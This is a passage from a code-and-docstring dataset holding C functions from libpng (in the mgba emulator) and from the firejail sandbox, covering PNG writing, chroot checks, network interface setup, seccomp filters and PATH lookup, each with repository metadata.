0; pass < passes; ++pass)\n         {\n            unsigned int y;\n\n            for (y=0; y<ysize; ++y)\n            {\n               unsigned int row_filters =\n                  generate_row(row, rowbytes, y, color_type, bit_depth,\n                        gamma_table, conv, colors, small);\n\n               if (row_filters != 0 && filters == PNG_ALL_FILTERS)\n                  png_set_filter(png_ptr, PNG_FILTER_TYPE_BASE, row_filters);\n\n               png_write_row(png_ptr, row);\n            }\n         }\n      }\n   }\n\n   /* Finish writing the file. */\n   png_write_end(png_ptr, info_ptr);\n\n   {\n      png_structp nv_ptr = png_ptr;\n      png_infop nv_info = info_ptr;\n\n      png_ptr = NULL;\n      info_ptr = NULL;\n      png_destroy_write_struct(&nv_ptr, &nv_info);\n   }\n   free(row);\n   return 0;\n}", "path": "mgba/src/third-party/libpng/contrib/libtests/makepng.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_colorspace_set_rgb_coefficients(png_structrp png_ptr)", "code": "{\n   /* Set the rgb_to_gray coefficients from the colorspace. */\n   if (png_ptr->rgb_to_gray_coefficients_set == 0 &&\n      (png_ptr->colorspace.flags & PNG_COLORSPACE_HAVE_ENDPOINTS) != 0)\n   {\n      /* png_set_background has not been called, get the coefficients from the Y\n       * values of the colorspace colorants.\n       */\n      png_fixed_point r = png_ptr->colorspace.end_points_XYZ.red_Y;\n      png_fixed_point g = png_ptr->colorspace.end_points_XYZ.green_Y;\n      png_fixed_point b = png_ptr->colorspace.end_points_XYZ.blue_Y;\n      png_fixed_point total = r+g+b;\n\n      if (total > 0 &&\n         r >= 0 && png_muldiv(&r, r, 32768, total) && r >= 0 && r <= 32768 &&\n         g >= 0 && png_muldiv(&g, g, 32768, total) && g >= 0 && g <= 32768 &&\n         b >= 0 && png_muldiv(&b, b, 32768, total) && b >= 0 && b <= 32768 &&\n         r+g+b <= 32769)\n      {\n         /* We allow 0 coefficients here.  r+g+b may be 32769 if two or\n          * all of the coefficients were rounded up.  Handle this by\n          * reducing the *largest* coefficient by 1; this matches the\n          * approach used for the default coefficients in pngrtran.c\n          */\n         int add = 0;\n\n         if (r+g+b > 32768)\n            add = -1;\n         else if (r+g+b < 32768)\n            add = 1;\n\n         if (add != 0)\n         {\n            if (g >= r && g >= b)\n               g += add;\n            else if (r >= g && r >= b)\n               r += add;\n            else\n               b += add;\n         }\n\n         /* Check for an internal error. */\n         if (r+g+b != 32768)\n            png_error(png_ptr,\n                \"internal error handling cHRM coefficients\");\n\n         else\n         {\n            png_ptr->rgb_to_gray_red_coeff   = (png_uint_16)r;\n            png_ptr->rgb_to_gray_green_coeff = (png_uint_16)g;\n         }\n      }\n\n      /* This is a png_error at present even though it could be ignored -\n       * it should never happen, but it is important that if it does, the\n       * bug is fixed.\n       */\n      else\n         png_error(png_ptr, \"internal error handling cHRM->XYZ\");\n   }\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* Convert the supplied time into an RFC 1123 string suitable for use in\n * a \"Creation Time\" or other text-based time string.\n */\n", "func_signal": "int PNGAPI\npng_convert_to_rfc1123_buffer(char out[29], png_const_timep ptime)", "code": "{\n   static PNG_CONST char short_months[12][4] =\n        {\"Jan\", \"Feb\", \"Mar\", \"Apr\", \"May\", \"Jun\",\n         \"Jul\", \"Aug\", \"Sep\", \"Oct\", \"Nov\", \"Dec\"};\n\n   if (out == NULL)\n      return 0;\n\n   if (ptime->year > 9999 /* RFC1123 limitation */ ||\n       ptime->month == 0    ||  ptime->month > 12  ||\n       ptime->day   == 0    ||  ptime->day   > 31  ||\n       ptime->hour  > 23    ||  ptime->minute > 59 ||\n       ptime->second > 60)\n      return 0;\n\n   {\n      size_t pos = 0;\n      char number_buf[5]; /* enough for a four-digit year */\n\n#     define APPEND_STRING(string) pos = png_safecat(out, 29, pos, (string))\n#     define APPEND_NUMBER(format, value)\\\n         APPEND_STRING(PNG_FORMAT_NUMBER(number_buf, format, (value)))\n#     define APPEND(ch) if (pos < 28) out[pos++] = (ch)\n\n      APPEND_NUMBER(PNG_NUMBER_FORMAT_u, (unsigned)ptime->day);\n      APPEND(' ');\n      APPEND_STRING(short_months[(ptime->month - 1)]);\n      APPEND(' ');\n      APPEND_NUMBER(PNG_NUMBER_FORMAT_u, ptime->year);\n      APPEND(' ');\n      APPEND_NUMBER(PNG_NUMBER_FORMAT_02u, (unsigned)ptime->hour);\n      APPEND(':');\n      APPEND_NUMBER(PNG_NUMBER_FORMAT_02u, (unsigned)ptime->minute);\n      APPEND(':');\n      APPEND_NUMBER(PNG_NUMBER_FORMAT_02u, (unsigned)ptime->second);\n      APPEND_STRING(\" +0000\"); /* This reliably terminates the buffer */\n      PNG_UNUSED (pos)\n\n#     undef APPEND\n#     undef APPEND_NUMBER\n#     undef APPEND_STRING\n   }\n\n   return 1;\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* error handler callbacks for libpng */\n", "func_signal": "static void PNGCBAPI\ndisplay_warning(png_structp pp, png_const_charp warning)", "code": "{\n   struct display *dp = get_dp(pp);\n\n   /* This is used to prevent repeated warnings while searching */\n   if (!dp->no_warnings)\n      display_log(get_dp(pp), LIBPNG_WARNING, \"%s\", warning);\n}", "path": "mgba/src/third-party/libpng/contrib/tools/pngcp.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* This is a not-very-good parser for a sequence of numbers (including 0).  It\n * doesn't accept some apparently valid things, but it accepts all the sensible\n * combinations.\n */\n", "func_signal": "static void\nparse_color(char *arg, unsigned int *colors)", "code": "{\n   unsigned int ncolors = 0;\n\n   while (*arg && ncolors < 4)\n   {\n      char *ep = arg;\n\n      unsigned long ul = strtoul(arg, &ep, 0);\n\n      if (ul > 65535)\n      {\n         fprintf(stderr, \"makepng --color=...'%s': too big\\n\", arg);\n         exit(1);\n      }\n\n      if (ep == arg)\n      {\n         fprintf(stderr, \"makepng --color=...'%s': not a valid color\\n\", arg);\n         exit(1);\n      }\n\n      if (*ep) ++ep; /* skip a separator */\n      arg = ep;\n\n      colors[++ncolors] = (unsigned int)ul; /* checked above */\n   }\n\n   if (*arg)\n   {\n      fprintf(stderr, \"makepng --color=...'%s': too many values\\n\", arg);\n      exit(1);\n   }\n\n   *colors = ncolors;\n}", "path": "mgba/src/third-party/libpng/contrib/libtests/makepng.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* The same but for a complete string. */\n", "func_signal": "int\npng_check_fp_string(png_const_charp string, png_size_t size)", "code": "{\n   int        state=0;\n   png_size_t char_index=0;\n\n   if (png_check_fp_number(string, size, &state, &char_index) != 0 &&\n      (char_index == size || string[char_index] == 0))\n      return state /* must be non-zero - see above */;\n\n   return 0; /* i.e. fail */\n}", "path": "mgba/src/third-party/libpng/png.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_write_transformations(png_structrp png_ptr, png_row_infop row_info)", "code": "{\n   png_debug(1, \"in png_do_write_transformations\");\n\n   if (png_ptr == NULL)\n      return;\n\n#ifdef PNG_WRITE_USER_TRANSFORM_SUPPORTED\n   if ((png_ptr->transformations & PNG_USER_TRANSFORM) != 0)\n      if (png_ptr->write_user_transform_fn != NULL)\n         (*(png_ptr->write_user_transform_fn)) /* User write transform\n                                                 function */\n             (png_ptr,  /* png_ptr */\n             row_info,  /* row_info: */\n                /*  png_uint_32 width;       width of row */\n                /*  png_size_t rowbytes;     number of bytes in row */\n                /*  png_byte color_type;     color type of pixels */\n                /*  png_byte bit_depth;      bit depth of samples */\n                /*  png_byte channels;       number of channels (1-4) */\n                /*  png_byte pixel_depth;    bits per pixel (depth*channels) */\n             png_ptr->row_buf + 1);      /* start of pixel data for row */\n#endif\n\n#ifdef PNG_WRITE_FILLER_SUPPORTED\n   if ((png_ptr->transformations & PNG_FILLER) != 0)\n      png_do_strip_channel(row_info, png_ptr->row_buf + 1,\n          !(png_ptr->flags & PNG_FLAG_FILLER_AFTER));\n#endif\n\n#ifdef PNG_WRITE_PACKSWAP_SUPPORTED\n   if ((png_ptr->transformations & PNG_PACKSWAP) != 0)\n      png_do_packswap(row_info, png_ptr->row_buf + 1);\n#endif\n\n#ifdef PNG_WRITE_PACK_SUPPORTED\n   if ((png_ptr->transformations & PNG_PACK) != 0)\n      png_do_pack(row_info, png_ptr->row_buf + 1,\n          (png_uint_32)png_ptr->bit_depth);\n#endif\n\n#ifdef PNG_WRITE_SWAP_SUPPORTED\n#  ifdef PNG_16BIT_SUPPORTED\n   if ((png_ptr->transformations & PNG_SWAP_BYTES) != 0)\n      png_do_swap(row_info, png_ptr->row_buf + 1);\n#  endif\n#endif\n\n#ifdef PNG_WRITE_SHIFT_SUPPORTED\n   if ((png_ptr->transformations & PNG_SHIFT) != 0)\n      png_do_shift(row_info, png_ptr->row_buf + 1,\n           &(png_ptr->shift));\n#endif\n\n#ifdef PNG_WRITE_SWAP_ALPHA_SUPPORTED\n   if ((png_ptr->transformations & PNG_SWAP_ALPHA) != 0)\n      png_do_write_swap_alpha(row_info, png_ptr->row_buf + 1);\n#endif\n\n#ifdef PNG_WRITE_INVERT_ALPHA_SUPPORTED\n   if ((png_ptr->transformations & PNG_INVERT_ALPHA) != 0)\n      png_do_write_invert_alpha(row_info, png_ptr->row_buf + 1);\n#endif\n\n#ifdef PNG_WRITE_BGR_SUPPORTED\n   if ((png_ptr->transformations & PNG_BGR) != 0)\n      png_do_bgr(row_info, png_ptr->row_buf + 1);\n#endif\n\n#ifdef PNG_WRITE_INVERT_SUPPORTED\n   if ((png_ptr->transformations & PNG_INVERT_MONO) != 0)\n      png_do_invert(row_info, png_ptr->row_buf + 1);\n#endif\n}", "path": "mgba/src/third-party/libpng/pngwtran.c", "commit_date": "2018-09-11 00:00:00", "repo_name": "mgba-emu/mgba", "stars": 5146, "license": "mpl-2.0", "language": "c", "size": 50982}
{"docstring": "// exit if error\n", "func_signal": "void fs_check_chroot_dir(void)", "code": "{\n\tEUID_ASSERT();\n\tassert(cfg.chrootdir);\n\tif (strstr(cfg.chrootdir, \"..\") ||\n\t    is_link(cfg.chrootdir))\n\t\tgoto errout;\n\n\t// check chroot dirname exists, chrooting into the root directory is not allowed\n\tchar *rpath = realpath(cfg.chrootdir, NULL);\n\tif (rpath == NULL || !is_dir(rpath) || strcmp(rpath, \"/\") == 0)\n\t\tgoto errout;\n\n\tchar *overlay;\n\tif (asprintf(&overlay, \"%s/.firejail\", cfg.homedir) == -1)\n\t\terrExit(\"asprintf\");\n\tif (strncmp(rpath, overlay, strlen(overlay)) == 0) {\n\t\tfprintf(stderr, \"Error: invalid chroot directory: no directories in %s are allowed\\n\", overlay);\n\t\texit(1);\n\t}\n\tfree(overlay);\n\n\tcfg.chrootdir = rpath;\n\treturn;\n\nerrout:\n\tfprintf(stderr, \"Error: invalid chroot directory %s\\n\", cfg.chrootdir);\n\texit(1);\n}", "path": "firejail/src/firejail/chroot.c", "commit_date": "2020-10-01 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// Note: the NULL element at the end of 'paths' is included in this count.\n", "func_signal": "unsigned int count_paths(void)", "code": "{\n\tif (!path_cnt)\n\t\tinit_paths();\n\tassert(path_cnt);\n\treturn path_cnt;\n}", "path": "firejail/src/firejail/paths.c", "commit_date": "2020-09-28 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// configure interface ipv4 address\n", "func_signal": "void net_if_ip(const char *ifname, uint32_t ip, uint32_t mask, int mtu)", "code": "{\n\tcheck_if_name(ifname);\n\tint sock = socket(AF_INET,SOCK_DGRAM,0);\n\tif (sock < 0)\n\t\terrExit(\"socket\");\n\n\tstruct ifreq ifr;\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);\n\tifr.ifr_addr.sa_family = AF_INET;\n\n\t((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr = htonl(ip);\n\tif (ioctl( sock, SIOCSIFADDR, &ifr ) < 0)\n\t\terrExit(\"ioctl\");\n\n\tif (ip != 0) {\n\t\t((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr =  htonl(mask);\n\t\tif (ioctl( sock, SIOCSIFNETMASK, &ifr ) < 0)\n\t\t\terrExit(\"ioctl\");\n\t}\n\n\t// configure mtu\n\tif (mtu > 0) {\n\t\tifr.ifr_mtu = mtu;\n\t\tif (ioctl( sock, SIOCSIFMTU, &ifr ) < 0)\n\t\t\terrExit(\"ioctl\");\n\t}\n\n\tclose(sock);\n\tusleep(10000);\t\t\t\t  // sleep 10ms\n\treturn;\n}", "path": "firejail/src/fnet/interface.c", "commit_date": "2020-01-27 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// scan interfaces in current namespace and print IP address/mask for each interface\n", "func_signal": "void net_ifprint(int scan)", "code": "{\n\tuint32_t ip;\n\tuint32_t mask;\n\tstruct ifaddrs *ifaddr, *ifa;\n\n\tif (getifaddrs(&ifaddr) == -1)\n\t\terrExit(\"getifaddrs\");\n\n\tfmessage(\"%-17.17s%-19.19s%-17.17s%-17.17s%-6.6s\\n\",\n\t\t\"Interface\", \"MAC\", \"IP\", \"Mask\", \"Status\");\n\t// walk through the linked list\n\tfor (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {\n\t\tif (ifa->ifa_addr == NULL)\n\t\t\tcontinue;\n\n\t\tif (ifa->ifa_addr->sa_family == AF_INET) {\n\t\t\tstruct sockaddr_in *si = (struct sockaddr_in *) ifa->ifa_netmask;\n\t\t\tmask = ntohl(si->sin_addr.s_addr);\n\t\t\tsi = (struct sockaddr_in *) ifa->ifa_addr;\n\t\t\tip = ntohl(si->sin_addr.s_addr);\n\n\t\t\t// interface status\n\t\t\tchar *status;\n\t\t\tif (ifa->ifa_flags & IFF_RUNNING && ifa->ifa_flags & IFF_UP)\n\t\t\t\tstatus = \"UP\";\n\t\t\telse\n\t\t\t\tstatus = \"DOWN\";\n\n\t\t\t// ip address and mask\n\t\t\tchar ipstr[30];\n\t\t\tsprintf(ipstr, \"%d.%d.%d.%d\", PRINT_IP(ip));\n\t\t\tchar maskstr[30];\n\t\t\tsprintf(maskstr, \"%d.%d.%d.%d\", PRINT_IP(mask));\n\n\t\t\t// mac address\n\t\t\tunsigned char mac[6];\n\t\t\tnet_get_mac(ifa->ifa_name, mac);\n\t\t\tchar macstr[30];\n\t\t\tif (strcmp(ifa->ifa_name, \"lo\") == 0)\n\t\t\t\tmacstr[0] = '\\0';\n\t\t\telse\n\t\t\t\tsprintf(macstr, \"%02x:%02x:%02x:%02x:%02x:%02x\", PRINT_MAC(mac));\n\n\t\t\t// print\n\t\t\tfmessage(\"%-17.17s%-19.19s%-17.17s%-17.17s%-6.6s\\n\",\n\t\t\t\tifa->ifa_name, macstr, ipstr, maskstr, status);\n\n\t\t\t// network scanning\n\t\t\tif (!scan)\t\t\t\t// scanning disabled\n\t\t\t\tcontinue;\n\t\t\tif (strcmp(ifa->ifa_name, \"lo\") == 0)\t// no loopbabck scanning\n\t\t\t\tcontinue;\n\t\t\tif (mask2bits(mask) < 16)\t\t// not scanning large networks\n\t\t\t\tcontinue;\n\t\t\tif (!ip)\t\t\t\t\t// if not configured\n\t\t\t\tcontinue;\n\t\t\t// only if the interface is up and running\n\t\t\tif (ifa->ifa_flags & IFF_RUNNING && ifa->ifa_flags & IFF_UP)\n\t\t\t\tarp_scan(ifa->ifa_name, ip, mask);\n\t\t}\n\t}\n\tfreeifaddrs(ifaddr);\n}", "path": "firejail/src/fnet/interface.c", "commit_date": "2020-01-27 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// default+drop\n", "func_signal": "void seccomp_default_drop(const char *fname1, const char *fname2, char *list, int allow_debuggers, bool native)", "code": "{\n\tassert(fname1);\n\tassert(fname2);\n\n\t// open file\n\tint fd = open(fname1, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\n\tif (fd < 0) {\n\t\tfprintf(stderr, \"Error fseccomp: cannot open %s file\\n\", fname1);\n\t\texit(1);\n\t}\n\n\t// build pre-exec filter: blacklist @default, don't blacklist\n\t// any listed syscalls in @default-keep\n\tfilter_init(fd, native);\n\n\t// allow exceptions in form of !syscall\n\tsyscall_check_list(list, filter_add_whitelist_for_excluded, fd, 0, NULL, native);\n\n\tadd_default_list(fd, allow_debuggers, native);\n\tchar *prelist, *postlist;\n\tsyscalls_in_list(list, \"@default-keep\", fd, &prelist, &postlist, native);\n\tif (prelist)\n\t\tif (syscall_check_list(prelist, filter_add_blacklist, fd, 0, NULL, native)) {\n\t\t\tfprintf(stderr, \"Error fseccomp: cannot build seccomp filter\\n\");\n\t\t\texit(1);\n\t\t}\n\tfilter_end_blacklist(fd);\n\n\t// close file\n\tclose(fd);\n\n\tif (!postlist)\n\t\treturn;\n\n\t// open file for post-exec filter\n\tfd = open(fname2, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\n\tif (fd < 0) {\n\t\tfprintf(stderr, \"Error fseccomp: cannot open %s file\\n\", fname2);\n\t\texit(1);\n\t}\n\n\t// build post-exec filter: blacklist remaining syscalls\n\tfilter_init(fd, native);\n\tif (syscall_check_list(postlist, filter_add_blacklist, fd, 0, NULL, native)) {\n\t\tfprintf(stderr, \"Error fseccomp: cannot build seccomp filter\\n\");\n\t\texit(1);\n\t}\n\tfilter_end_blacklist(fd);\n\n\t// close file\n\tclose(fd);\n}", "path": "firejail/src/fseccomp/seccomp.c", "commit_date": "2020-04-06 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// clean run directory\n", "func_signal": "void preproc_clean_run(void)", "code": "{\n\tint max_pids=32769;\n\tint start_pid = 100;\n\t// extract real max_pids\n\tFILE *fp = fopen(\"/proc/sys/kernel/pid_max\", \"r\");\n\tif (fp) {\n\t\tint val;\n\t\tif (fscanf(fp, \"%d\", &val) == 1) {\n\t\t\tif (val > 4194304)\t// this is the max value supported on 64 bit Linux kernels\n\t\t\t\tval = 4194304;\n\t\t\tif (val >= max_pids)\n\t\t\t\tmax_pids = val + 1;\n\t\t}\n\t\tfclose(fp);\n\t}\n\tint *pidarr = malloc(max_pids * sizeof(int));\n\tif (!pidarr)\n\t\terrExit(\"malloc\");\n\n\tmemset(pidarr, 0, max_pids * sizeof(int));\n\n\t// open /proc directory\n\tDIR *dir;\n\tif (!(dir = opendir(\"/proc\"))) {\n\t\t// sleep 2 seconds and try again\n\t\tsleep(2);\n\t\tif (!(dir = opendir(\"/proc\"))) {\n\t\t\tfprintf(stderr, \"Error: cannot open /proc directory\\n\");\n\t\t\texit(1);\n\t\t}\n\t}\n\n\t// read /proc and populate pidarr with all active processes\n\tstruct dirent *entry;\n\tchar *end;\n\twhile ((entry = readdir(dir)) != NULL) {\n\t\tpid_t pid = strtol(entry->d_name, &end, 10);\n\t\tpid %= max_pids;\n\t\tif (end == entry->d_name || *end)\n\t\t\tcontinue;\n\n\t\tif (pid < start_pid)\n\t\t\tcontinue;\n\t\tpidarr[pid] = 1;\n\t}\n\tclosedir(dir);\n\n\t// clean profile and name directories\n\tclean_dir(RUN_FIREJAIL_PROFILE_DIR, pidarr, start_pid, max_pids);\n\tclean_dir(RUN_FIREJAIL_NAME_DIR, pidarr, start_pid, max_pids);\n\n\tfree(pidarr);\n}", "path": "firejail/src/firejail/preproc.c", "commit_date": "2020-09-01 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// moved from inside init_paths in order to get rid of scan-build warning\n", "func_signal": "static void init_paths(void)", "code": "{\n\tchar *path = getenv(\"PATH\");\n\tchar *p;\n\tif (!path) {\n\t\tpath = \"/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin\";\n\t\tsetenv(\"PATH\", path, 1);\n\t}\n\tpath = strdup(path);\n\tif (!path)\n\t\terrExit(\"strdup\");\n\n\t// size the paths array\n\tfor (p = path; *p; p++)\n\t\tif (*p == ':')\n\t\t\tpath_cnt++;\n\tpath_cnt += 2; // one because we were counting fenceposts, one for the NULL at the end\n\n\tpaths = calloc(path_cnt, sizeof(char *));\n\tif (!paths)\n\t\terrExit(\"calloc\");\n\tmemset(paths, 0, path_cnt * sizeof(char *)); // get rid of false positive error from GCC static analyzer\n\n\t// fill in 'paths' with pointers to elements of 'path'\n\tunsigned int i = 0, j;\n\tunsigned int len;\n\twhile ((elt = strsep(&path, \":\")) != NULL) {\n\t\t// skip any entry that is not absolute\n\t\tif (elt[0] != '/')\n\t\t\tgoto skip;\n\n\t\t// strip trailing slashes (this also prevents '/' from being a path entry).\n\t\tlen = strlen(elt);\n\t\twhile (len > 0 && elt[len-1] == '/')\n\t\t\telt[--len] = '\\0';\n\t\tif (len == 0)\n\t\t\tgoto skip;\n\n\t\t// filter out duplicate entries\n\t\tfor (j = 0; j < i; j++)\n\t\t\tif (strcmp(elt, paths[j]) == 0)\n\t\t\t\tgoto skip;\n\n\t\tpaths[i++] = elt;\n\t\tif (len > longest_path_elt)\n\t\t\tlongest_path_elt = len;\n\n\t\tskip:;\n\t}\n\n\tassert(paths[i] == NULL);\n\t// path_cnt may be too big now, if entries were skipped above\n\tpath_cnt = i+1;\n}", "path": "firejail/src/firejail/paths.c", "commit_date": "2020-09-28 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// build /run/firejail/mnt directory\n", "func_signal": "void preproc_mount_mnt_dir(void)", "code": "{\n\t// mount tmpfs on top of /run/firejail/mnt\n\tif (!tmpfs_mounted) {\n\t\tif (arg_debug)\n\t\t\tprintf(\"Mounting tmpfs on %s directory\\n\", RUN_MNT_DIR);\n\t\tif (mount(\"tmpfs\", RUN_MNT_DIR, \"tmpfs\", MS_NOSUID | MS_STRICTATIME,  \"mode=755,gid=0\") < 0)\n\t\t\terrExit(\"mounting /run/firejail/mnt\");\n\t\ttmpfs_mounted = 1;\n\t\tfs_logger2(\"tmpfs\", RUN_MNT_DIR);\n\n\t\t// open and mount trace file while there are no user-writable files in RUN_MNT_DIR\n\t\tif (arg_tracefile)\n\t\t\tfs_tracefile();\n\n\t\tcreate_empty_dir_as_root(RUN_SECCOMP_DIR, 0755);\n\n\t\tif (arg_seccomp_block_secondary)\n\t\t\tcopy_file(PATH_SECCOMP_BLOCK_SECONDARY, RUN_SECCOMP_BLOCK_SECONDARY, getuid(), getgid(), 0644); // root needed\n\t\telse {\n\t\t\t//copy default seccomp files\n\t\t\tcopy_file(PATH_SECCOMP_32, RUN_SECCOMP_32, getuid(), getgid(), 0644); // root needed\n\t\t}\n\t\tif (arg_allow_debuggers) {\n\t\t\tcopy_file(PATH_SECCOMP_DEFAULT_DEBUG, RUN_SECCOMP_CFG, getuid(), getgid(), 0644); // root needed\n\t\t\tcopy_file(PATH_SECCOMP_DEBUG_32, RUN_SECCOMP_32, getuid(), getgid(), 0644); // root needed\n\t\t} else\n\t\t\tcopy_file(PATH_SECCOMP_DEFAULT, RUN_SECCOMP_CFG, getuid(), getgid(), 0644); // root needed\n\n\t\tif (arg_memory_deny_write_execute) {\n\t\t\tcopy_file(PATH_SECCOMP_MDWX, RUN_SECCOMP_MDWX, getuid(), getgid(), 0644); // root needed\n\t\t\tcopy_file(PATH_SECCOMP_MDWX_32, RUN_SECCOMP_MDWX_32, getuid(), getgid(), 0644); // root needed\n\t\t}\n\t\t// as root, create empty RUN_SECCOMP_PROTOCOL and RUN_SECCOMP_POSTEXEC files\n\t\tcreate_empty_file_as_root(RUN_SECCOMP_PROTOCOL, 0644);\n\t\tif (set_perms(RUN_SECCOMP_PROTOCOL, getuid(), getgid(), 0644))\n\t\t\terrExit(\"set_perms\");\n\t\tcreate_empty_file_as_root(RUN_SECCOMP_POSTEXEC, 0644);\n\t\tif (set_perms(RUN_SECCOMP_POSTEXEC, getuid(), getgid(), 0644))\n\t\t\terrExit(\"set_perms\");\n\t\tcreate_empty_file_as_root(RUN_SECCOMP_POSTEXEC_32, 0644);\n\t\tif (set_perms(RUN_SECCOMP_POSTEXEC_32, getuid(), getgid(), 0644))\n\t\t\terrExit(\"set_perms\");\n\t}\n}", "path": "firejail/src/firejail/preproc.c", "commit_date": "2020-09-01 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// exit if error\n", "func_signal": "static void check_subdir(int parentfd, const char *subdir, int check_writable)", "code": "{\n\tassert(subdir && subdir[0] && subdir[0] != '/');\n\tstruct stat s;\n\tif (fstatat(parentfd, subdir, &s, AT_SYMLINK_NOFOLLOW) != 0) {\n\t\tfprintf(stderr, \"Error: cannot find /%s in chroot directory\\n\", subdir);\n\t\texit(1);\n\t}\n\tif (!S_ISDIR(s.st_mode)) {\n\t\tif (S_ISLNK(s.st_mode))\n\t\t\tfprintf(stderr, \"Error: chroot /%s is a symbolic link\\n\", subdir);\n\t\telse\n\t\t\tfprintf(stderr, \"Error: chroot /%s is not a directory\\n\", subdir);\n\t\texit(1);\n\t}\n\tif (s.st_uid != 0) {\n\t\tfprintf(stderr, \"Error: chroot /%s should be owned by root\\n\", subdir);\n\t\texit(1);\n\t}\n\tif (check_writable && ((S_IWGRP|S_IWOTH) & s.st_mode) != 0) {\n\t\tfprintf(stderr, \"Error: only root user should be given write permission on chroot /%s\\n\", subdir);\n\t\texit(1);\n\t}\n}", "path": "firejail/src/firejail/chroot.c", "commit_date": "2020-10-01 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// bring interface up\n", "func_signal": "void net_if_up(const char *ifname)", "code": "{\n\tcheck_if_name(ifname);\n\n\tint sock = socket(AF_INET,SOCK_DGRAM,0);\n\tif (sock < 0)\n\t\terrExit(\"socket\");\n\n\t// get the existing interface flags\n\tstruct ifreq ifr;\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);\n\tifr.ifr_addr.sa_family = AF_INET;\n\n\t// read the existing flags\n\tif (ioctl(sock, SIOCGIFFLAGS, &ifr ) < 0)\n\t\terrExit(\"ioctl\");\n\n\tifr.ifr_flags |= IFF_UP;\n\n\t// set the new flags\n\tif (ioctl( sock, SIOCSIFFLAGS, &ifr ) < 0)\n\t\terrExit(\"ioctl\");\n\n\t// checking\n\t// read the existing flags\n\tif (ioctl(sock, SIOCGIFFLAGS, &ifr ) < 0)\n\t\terrExit(\"ioctl\");\n\n\t// wait not more than 500ms for the interface to come up\n\tint cnt = 0;\n\twhile (cnt < 50) {\n\t\tusleep(10000);\t\t\t  // sleep 10ms\n\n\t\t// read the existing flags\n\t\tif (ioctl(sock, SIOCGIFFLAGS, &ifr ) < 0)\n\t\t\terrExit(\"ioctl\");\n\t\tif (ifr.ifr_flags & IFF_RUNNING)\n\t\t\tbreak;\n\t\tcnt++;\n\t}\n\n\tclose(sock);\n}", "path": "firejail/src/fnet/interface.c", "commit_date": "2020-01-27 00:00:00", "repo_name": "netblue30/firejail", "stars": 5360, "license": "gpl-2.0", "language": "c", "size": 21813}
{"docstring": "// Return 1 if PROGRAM exists in $PATH and is runnable by the\n// invoking user (not root).\n// In other words, tests \"will execvp(PROGRAM, ...) succeed?\"\n", "func_signal": "int program_in_path(const char *program)", "code": "{\n\tassert(program && *program);\n\tassert(strchr(program, '/') == 0);\n\tassert(strcmp(program, \".\") != 0);\n\tassert(strcmp(program, \"..\") != 0);\n\n\tif (!paths)\n\t\tinit_paths();\n\tassert(paths);\n\n\tsize_t proglen = strlen(program);\n\tchar *scratch = malloc(longest_path_elt + proglen + 2);\n\tif (!scratch)\n\t\terrExit(\"malloc\");\n\n\tint found = 0;\n\tsize_t dlen;\n\tchar **p;\n\tfor (p = paths; *p; p++) {\n\t\tchar *dir = *p;\n\t\tdlen = strlen(dir);\n\n\t\t// init_paths should ensure that this is true; as long\n\t\t// as it is true, 'scratch' has enough space for \"$p/$program\".\n\t\tassert(dlen <= longest_path_elt);\n\n\t\tmemcpy(scratch, dir, dlen);\n\t\tscratch[dlen++] = '/';\n\n\t\t// copy proglen+1 bytes to copy the nul terminator at\n\t\t// the end of 'program'.\n\t\tmemcpy(scratch + dlen, program, proglen+1);\n\n\t\tif (access(scratch, X_OK) == 0) {\n\t\t\t// must also verify that this is a regular file\n\t\t\t// ('x' permission means something different for directories).\n\t\t\t// exec follows symlinks, so use stat, not lstat.\n\t\t\tstruct stat st;\n\t\t\tif (stat(scratch, &st)) {\n\t\t\t\tperror(scratch);\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tif (S_ISREG(st.st_mode)) 